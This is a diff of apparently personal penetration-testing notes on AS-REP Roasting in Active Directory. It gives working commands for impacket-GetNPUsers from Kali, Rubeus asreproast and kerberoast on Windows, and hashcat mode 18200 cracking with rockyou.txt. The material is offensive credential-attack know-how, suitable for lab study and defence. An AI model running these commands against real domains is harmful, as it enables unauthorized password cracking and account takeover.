@@ -11,7 +11,7 @@ This attack is known as AS-REP Roasting.
  By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. 
  However, it is possible to enable this account option manually. 
 
-Let's perform this attack from our Kali machine first, then on Windows. 
+From remotely our Kali machine first, then locally on Windows. 
 On Kali, we can use impacket-GetNPUsers to perform AS-REP roasting. 
 We'll need to enter the IP address of the DC as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.
 
@@ -43,7 +43,16 @@ kali@kali:~$ hashcat --help | grep -i "Kerberos"
    
 The output of the grep command shows that the correct mode for AS-REP is 18200.
 
-We've now collected everything we need to launch Hashcat and crack the AS-REP hash. 
-Let's enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on our Kali VM.
+We've collected what we need to use Hashcat and crack the AS-REP hash. 
+Enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on your Kali VM.
 
 kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+AS-REP Roasting on Windows. 
+We'll use Rubeus, which is a tool for raw Kerberos interactions and abuse.
+
+PS C:\mute> .\Rubeus.exe asreproast /nowrap
+PS C:\mute> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast <-- Might as well do a quick kerberoast while your cooking.
+
+kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
